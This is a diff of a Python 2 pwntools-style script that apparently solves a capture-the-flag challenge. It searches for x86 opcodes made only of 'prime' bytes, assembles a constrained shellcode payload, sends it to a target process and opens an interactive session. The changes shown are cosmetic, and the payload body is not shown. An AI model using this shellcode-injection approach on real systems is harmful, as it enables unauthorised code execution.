@@ -1,3 +1,4 @@
+#!/usr/bin/env python2
 
 import sys
 from itertools import *
@@ -87,6 +88,7 @@ def modinv(a, m):
 def add_inv(n):
 	return (256-n) % 256
 
+
 def print_good_opcode(s):
 	if  False or \
 		"(bad)" in s or \
@@ -101,11 +103,12 @@ def print_good_opcode(s):
 	else:
 		print s
 
+
 def print_opcodes():
 	
 	# hard coded, who cares, there is some clever way with itertools
 	# x86 has a maximum of 15 bytes according to Intel
-		
+	
 	for p in prime_bytes:
 		dis = disasm(chr(p))
 		print_good_opcode(dis)
@@ -145,10 +148,7 @@ def print_opcodes():
 	#	dis = disasm(chr(p)+chr(q)+chr(r)+chr(s)+chr(t)+chr(u)+chr(v)+chr(x))
 	#	print_good_opcode(dis)
 
-# registers state before jumpTo
-#
-#
-#
+# mind registers state before jumpTo
 
 def craft_payload():
 	global p_payload
@@ -268,6 +268,7 @@ def craft_payload():
 	#print binascii.hexlify(compiled)
 	print str(len(compiled))
 
+
 def main():
 	#print ",".join([hex(p) for p in prime_bytes])
 	#print_opcodes()
@@ -275,8 +276,7 @@ def main():
 	craft_payload()
 	
 	compiled = asm(p_payload)
-	
-	
+
 	#gdb.attach(p)   # attach gdb to process # b *0x13373f0
 	#print("press start when ready")
 	#raw_input()  # wait for us setting up gdb breakpoints
@@ -284,8 +284,5 @@ def main():
 	p.send(compiled)
 	
 	p.interactive()
-
-
-
 
 main()
